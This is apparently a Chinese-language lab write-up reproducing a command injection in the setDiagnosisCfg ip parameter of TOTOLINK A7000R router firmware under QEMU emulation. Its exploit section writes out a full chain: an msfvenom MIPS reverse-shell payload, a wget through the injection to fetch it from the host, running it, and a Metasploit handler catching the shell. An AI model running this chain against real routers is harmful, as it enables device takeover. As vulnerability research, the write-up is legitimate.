## 漏洞描述
漏洞类型：命令注入

版本：A7000R V9.1.0u.6115_B20201022

漏洞位置：`setDiagnosisCfg`的ip参数

固件下载地址：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/171/ids/36.html

## 漏洞分析


## 漏洞复现
采用全系统仿真，配置主机网络

```
sudo brctl addbr virbr2 # 创建网桥  
sudo ifconfig virbr2 192.168.122.1/24 up # 配置网桥IP  
sudo tunctl -t tap2 # 添加虚拟网卡tap2  
sudo ifconfig tap2 192.168.122.11/24 up # 配置虚拟网卡IP  
sudo brctl addif virbr2 tap2 # 配置虚拟网卡与网桥连接
```

启动全系统仿真

```
sudo qemu-system-mipsel \  
-M malta \  
-cpu 74Kf \  
-m 2G \  
-object rng-random,id=rng0,filename=/dev/urandom -device virtio-rng-pci,rng=rng0 \  
-kernel vmlinux-3.2.0-4-4kc-malta \  
-hda debian_wheezy_mipsel_standard.qcow2 \  
-append "root=/dev/sda1 console=tty0" \  
-netdev tap,id=tapnet,ifname=tap2,script=no \  
-device rtl8139,netdev=tapnet \  
-nographic
```

root:root登录，设置客户机eth0 ip：

```
ifconfig eth0 192.168.122.15 up # 配置路由器IP
```

注释掉配置文件`/lighttpd/lighttpd.conf`并将指定pid文件那一行

![](images/Pasted%20image%2020230823104639.png)

将文件系统从主机传到客户机上

```
scp -r squashfs-root/ root@192.168.122.15:/root/ # 拷贝路由器文件到虚拟机
```

chroot启动http服务

```
chroot ./squashfs-root/ /bin/sh   
/usr/sbin/lighttpd -f /lighttp/lighttpd.conf -m /lighttp/lib    #-m指定动态链接库所在文件夹
```

#TODO 命令行启动图

主机浏览器访问，可以访问得到

![](images/Pasted%20image%2020230823104729.png)

用Burpsuite抓取数据包修改，如图所示，执行ls命令可以得到结果，命令成功被执行。

![](images/Pasted%20image%2020230823104959.png)
## exploit
利用msf获取shell

### 安装msf
在ubuntu上安装msf的方法([Ubuntu快速安装MSF](https://www.cnblogs.com/tomyyyyy/p/12813299.html))：运行官方安装脚本

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \chmod 755 msfinstall && \./msfinstall
```

安装postgresql数据库，确认服务启动

```
sudo apt install postgresql
sudo service postgresql status
```

输入`msfconsole`，提示是否建立一个数据库，选择`y`。

输入`search windows` 测试数据库是否可用，可用到此结束。

### payload
利用msfvenom命令生成payload

```
msfvenom -p linux/mipsle/shell/reverse_tcp LHOST=192.168.122.11 LPORT=1234 -f elf > payload.elf
```

然后主机payload目录开启python http服务，通过命令执行让客户端wget下载payload

![](images/Pasted%20image%2020230823105817.png)

![](images/Pasted%20image%2020230823105904.png)

此时客户机上已经有了相应文件

![](images/Pasted%20image%2020230823105940.png)

接下来通过命令执行赋给payload.elf执行权限
```
chmod +x payload.elf
```

在主机上输入`msfconsole` 开启msf并配置运行

```
use exploit/multi/handler  
set payload linux/mipsle/shell/reverse_tcp  
set lhost 192.168.122.11  
set lport 1234
run
```

![](images/Pasted%20image%2020230823110320.png)

接着通过命令执行漏洞让客户端执行payload.elf：`./paylaod.elf`，然后主机就获取到了客户机的shell。

![](images/Pasted%20image%2020230823110557.png)

参考链接：

[TOTOLINK CVE-2022-37083 漏洞分析&复现 (qq.com)](https://mp.weixin.qq.com/s/ySKTpj8-u7Fk1mJzu8NLig)

[对tenda getshell之后的reverse_shell | ZhouYetao](https://zhouyetao.github.io/2021/09/19/%E5%AF%B9tenda%20getshell%E4%B9%8B%E5%90%8E%E7%9A%84reverse_shell/)
